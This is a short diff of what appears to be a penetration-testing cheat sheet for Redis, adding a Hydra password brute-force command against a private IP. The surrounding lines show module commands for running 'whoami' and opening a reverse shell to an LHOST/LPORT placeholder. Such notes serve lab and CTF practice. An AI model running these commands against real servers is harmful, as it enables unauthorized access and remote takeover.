@@ -24,3 +24,11 @@ system.exec "whoami"
 system.rev LHOST LPORT
 ```
 [HINT](https://www.youtube.com/watch?v=LlzpyGcA-ak&ab_channel=Tech69)
+
+## Write to File
+
+
+## Hydra
+```
+hydra -P /usr/share/wordlists/rockyou.txt redis://192.168.176.166
+```
